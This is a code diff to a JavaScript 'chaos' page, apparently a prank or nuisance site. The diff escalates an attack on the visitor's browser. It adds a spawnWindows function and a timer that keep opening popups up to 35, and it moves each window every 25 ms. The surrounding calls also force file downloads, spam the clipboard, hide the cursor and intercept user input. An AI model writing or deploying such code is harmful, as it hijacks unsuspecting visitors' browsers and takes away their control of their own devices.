@@ -237,7 +237,7 @@
         if (interactionCount === 1) {
           startAlertInterval();
         }
-        if (event.which !== 0) openWindow();
+        if (event.which !== 0) spawnWindows(2);
         triggerFileDownload();
         copySpamToClipboard();
         speak();
@@ -261,8 +261,15 @@
         rainbowThemeColor();
         animateUrlWithEmojis();
 
+        setInterval(() => {
+          if (wins.length < 35) {
+            openWindow();
+          }
+        }, 1200);
+
         interceptUserInput(handleChaosInput);
         handleChaosInput(event);
+        spawnWindows(5);
       }
 
       function handleChaosInput(event) {
@@ -273,7 +280,7 @@
           try { event.stopPropagation(); } catch (e) {}
         }
 
-        if (!event || event.which !== 0) openWindow();
+        if (!event || event.which !== 0) spawnWindows(2);
 
         startVibrateInterval();
         enablePictureInPicture();
@@ -548,6 +555,18 @@
       } catch (e) {}
     }
 
+    function spawnWindows(count = 1) {
+      for (let i = 0; i < count; i++) {
+        if (i === 0) {
+          openWindow();
+        } else {
+          setTimeout(() => {
+            openWindow();
+          }, i * 120);
+        }
+      }
+    }
+
     function hideCursor() {
       document.documentElement.style.cursor = 'none';
       document.body.style.cursor = 'none';
@@ -670,58 +689,48 @@
     }
 
     function moveWindowBounce() {
-      let vx = (Math.random() > 0.5 ? 1 : -1) * VELOCITY;
-      let vy = (Math.random() > 0.5 ? 1 : -1) * VELOCITY;
-      let lastX = window.screenX;
-      let lastY = window.screenY;
-      let stuckX = 0;
-      let stuckY = 0;
+      const pw = window.outerWidth || WIN_WIDTH;
+      const ph = window.outerHeight || WIN_HEIGHT;
+      const maxW = (window.screen.availWidth || 1920) - 15;
+      const maxH = (window.screen.availHeight || 1080) - 35;
+      const minX = 5;
+      const minY = 5;
+
+      let x = Math.max(minX, Math.min(window.screenX || Math.floor(Math.random() * (maxW - pw)), maxW - pw));
+      let y = Math.max(minY, Math.min(window.screenY || Math.floor(Math.random() * (maxH - ph)), maxH - ph));
+
+      const speedX = 8 + Math.floor(Math.random() * 5);
+      const speedY = 7 + Math.floor(Math.random() * 5);
+      let vx = (Math.random() > 0.5 ? 1 : -1) * speedX;
+      let vy = (Math.random() > 0.5 ? 1 : -1) * speedY;
 
       setInterval(() => {
-        const screenW = window.screen.availWidth || window.screen.width || SCREEN_WIDTH;
-        const screenH = window.screen.availHeight || window.screen.height || SCREEN_HEIGHT;
-        const x = window.screenX;
-        const y = window.screenY;
-        const width = window.outerWidth || WIN_WIDTH;
-        const height = window.outerHeight || WIN_HEIGHT;
+        const curMaxW = (window.screen.availWidth || 1920) - 15;
+        const curMaxH = (window.screen.availHeight || 1080) - 35;
+        const curW = window.outerWidth || pw;
+        const curH = window.outerHeight || ph;
 
-        if (x <= 15) {
-          vx = Math.abs(vx);
-        } else if (x + width >= screenW - 35) {
+        x += vx;
+        y += vy;
+
+        if (x + curW >= curMaxW) {
+          x = curMaxW - curW;
           vx = -Math.abs(vx);
+        } else if (x <= minX) {
+          x = minX;
+          vx = Math.abs(vx);
         }
 
-        if (y <= 35) {
-          vy = Math.abs(vy);
-        } else if (y + height >= screenH - 55) {
+        if (y + curH >= curMaxH) {
+          y = curMaxH - curH;
           vy = -Math.abs(vy);
+        } else if (y <= minY) {
+          y = minY;
+          vy = Math.abs(vy);
         }
 
-        if ((vx > 0 && x <= lastX) || (vx < 0 && x >= lastX)) {
-          stuckX++;
-          if (stuckX >= 2) {
-            vx = -vx;
-            stuckX = 0;
-          }
-        } else {
-          stuckX = 0;
-        }
-
-        if ((vy > 0 && y <= lastY) || (vy < 0 && y >= lastY)) {
-          stuckY++;
-          if (stuckY >= 2) {
-            vy = -vy;
-            stuckY = 0;
-          }
-        } else {
-          stuckY = 0;
-        }
-
-        lastX = x;
-        lastY = y;
-
-        window.moveBy(vx, vy);
-      }, TICK_LENGTH);
+        window.moveTo(Math.round(x), Math.round(y));
+      }, 25);
     }
 
     function startVideo() {
